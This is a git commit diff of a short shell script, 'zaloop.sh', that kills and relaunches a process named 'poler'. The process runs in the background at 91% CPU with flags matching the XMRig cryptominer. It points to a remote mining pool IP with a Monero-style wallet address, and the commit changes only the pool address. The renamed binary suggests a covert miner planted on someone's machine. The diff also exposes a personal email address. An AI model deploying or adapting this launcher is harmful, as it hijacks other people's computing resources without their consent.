377ee29e239b6773d88fc1ddf1d924535ec75df9
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-07-31 13:42:53 +0300

    w20-v1

--- zaloop.sh
+++ zaloop.sh
@@ -1,4 +1,4 @@
 pkill poler
 sleep 10
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 91 --cpu-priority 5 -o 109.234.34.135:5999 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w20-v0:ivanovandrey1984g@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 91 --cpu-priority 5 -o 109.234.36.240:6050 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w20-v1:ivanovandrey1984g@gmail.com -k
 
